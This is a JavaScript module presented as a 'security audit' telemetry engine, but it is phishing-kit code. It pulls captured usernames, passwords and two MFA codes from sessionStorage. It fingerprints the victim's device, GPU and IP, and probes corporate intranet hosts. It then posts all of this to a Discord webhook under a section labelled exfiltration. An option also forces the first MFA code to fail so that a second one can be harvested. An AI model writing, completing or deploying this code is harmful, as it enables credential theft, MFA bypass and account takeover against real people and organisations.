/**
 * =====================================================================
 * TELEMETRY PRO: BASE ENGINE (telemetry.js)
 * =====================================================================
 * * PURPOSE:
 * This script runs in the background to capture hardware details, 
 * network info, and login credentials for your security audits.
 * * * SETUP:
 * 1. Put your Discord Webhook URL in the config below.
 * 2. Make sure your HTML has the correct IDs (u, p, otp) so this 
 * script can grab the data from sessionStorage.
 * =====================================================================
 */

const TelemetryScanner = {
    
    // --- 1. CONFIGURATION ---
    config: {
        // Put your Discord webhook link here so the tool can send you data
        webhookUrl: 'YOUR_WEBHOOK_URL_HERE',
        
        // Set to true if you want to force the first MFA code to fail 
        // so you can grab a second fresh one.
        enableGhosting: false,
        
        // These are local domains. If the user's browser can ping these,
        // we know they are on the inside of a corporate network or VPN.
        internalMarkers: ['corp.local', 'intranet.internal', 'fileshare.corp']
    },

    // --- 2. HARDWARE FINGERPRINTING ---
    getFingerprint: function() {
        // Draws a hidden image and hashes it. This gives us a unique ID 
        // for the device that doesn't change even if they use a VPN.
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Audit_ID_v1", 2, 15);
        return btoa(canvas.toDataURL()).slice(-40, -10);
    },

    // --- 3. GPU PROFILING (WebGL) ---
    getGPUInfo: function() {
        // Grabs the actual graphics card name (like 'Apple M2' or 'NVIDIA').
        // Useful to see if they are running in a virtual machine or sandbox.
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            
            if (debugInfo) {
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
            return "Extension Unsupported";
        } catch (e) {
            return "WebGL Disabled";
        }
    },

    // --- 4. NETWORK & ANOMALY ASSESSMENT ---
    getNetworkData: async function() {
        // Checks their IP against known proxy/VPN lists and compares
        // the IP's timezone against their computer's local clock.
        try {
            const res = await fetch('http://ip-api.com/json/?fields=status,message,country,city,isp,proxy,hosting,timezone,query');
            const data = await res.json();
            
            const localTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const isTzMismatch = data.status === "success" && data.timezone !== localTz;
            
            return {
                ip: data.query || "Masked",
                isp: data.isp || "Unknown",
                isProxy: data.proxy || data.hosting || isTzMismatch,
                location: data.status === "success" ? `${data.city}, ${data.country}` : "Unknown",
                tzAnalysis: isTzMismatch ? `MISMATCH (Local: ${localTz} | IP: ${data.timezone})` : "Match"
            };
        } catch (error) {
            return { ip: "Fetch Failed", isProxy: false, location: "Unknown", tzAnalysis: "N/A" };
        }
    },

    // --- 5. NETWORK CONTEXT (Intranet Detection) ---
    checkInternalAccess: async function() {
        // Tries to load a tiny image from the internal markers listed in config.
        // If it succeeds, the target is on the company network.
        const results = await Promise.all(this.config.internalMarkers.map(async (host) => {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);
                await fetch(`https://${host}/favicon.ico`, { mode: 'no-cors', signal: controller.signal });
                return true;
            } catch (e) {
                return false;
            }
        }));
        return results.includes(true) ? "Internal (Corp Network)" : "External (Internet)";
    },

    // --- 6. SYSTEM & BEHAVIORAL DATA ---
    getSystemData: function() {
        // Gathers basic browser and hardware specs
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            ram: navigator.deviceMemory || 'N/A', 
            resolution: `${window.screen.width}x${window.screen.height}`,
            cores: navigator.hardwareConcurrency || 'N/A',
            gpu: this.getGPUInfo(),
            language: navigator.language
        };
    },

    // --- 7. EXFILTRATION ---
    sendToWebhook: async function(data, isFinal) {
        // Stops execution if you forgot to add your webhook URL
        if (this.config.webhookUrl === 'YOUR_WEBHOOK_URL_HERE') return;

        // Pulls the captured data that app.js saved into sessionStorage
        const session = {
            user: sessionStorage.getItem('log_u') || 'none',
            pass: sessionStorage.getItem('log_p') || 'none',
            mfa1: sessionStorage.getItem('mfa_1') || '-',
            mfa2: sessionStorage.getItem('mfa_2') || '-'
        };

        const riskStatus = data.net.isProxy ? "HIGH RISK (VPN/Anomaly)" : "Low Risk (Residential)";
        const embedColor = data.net.isProxy ? 15158332 : 3066993; // Red for proxy, Green for clean

        // The payload formatted for a Discord embed
        const payload = {
            username: "Identity-Audit-Monitor",
            embeds: [{
                title: isFinal ? "Audit Complete - Identity Captured" : "Partial Audit - Credentials Logged",
                color: embedColor,
                fields: [
                    { name: "Fingerprint ID", value: `\`${data.fp}\``, inline: true },
                    { name: "Risk Assessment", value: riskStatus, inline: true },
                    { name: "Network Context", value: `**Environment:** ${data.context}`, inline: true },
                    { name: "Connection Details", value: `**IP:** ${data.net.ip}\n**ISP:** ${data.net.isp}\n**Loc:** ${data.net.location}` },
                    { name: "Anomalies", value: `**Timezone:** ${data.net.tzAnalysis}\n**Language:** ${data.sys.language}`, inline: true },
                    { name: "Hardware Specs", value: `**GPU:** ${data.sys.gpu}\n**Platform:** ${data.sys.platform}\n**Specs:** ${data.sys.cores} Core / ${data.sys.ram}GB`, inline: true },
                    { name: "Captured Identity", value: `**Username:** \`${session.user}\` \n**Password:** \`${session.pass}\`` },
                    { name: "MFA Token Stream", value: `**Attempt 1:** \`${session.mfa1}\` \n**Attempt 2:** \`${session.mfa2}\`` }
                ],
                footer: { text: `Audit Framework • ${new Date().toLocaleString()}` }
            }]
        };

        try {
            await fetch(this.config.webhookUrl, { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify(payload) 
            });
        } catch (error) {
            console.error("Exfil error.");
        }
    },

    // --- 8. MASTER CONTROLLER ---
    runAudit: async function(isFinal = false) {
        // Gathers all the data points and fires them off to the webhook
        const report = {
            fp: this.getFingerprint(),
            net: await this.getNetworkData(),
            sys: this.getSystemData(),
            context: await this.checkInternalAccess()
        };
        
        await this.sendToWebhook(report, isFinal);
    }
};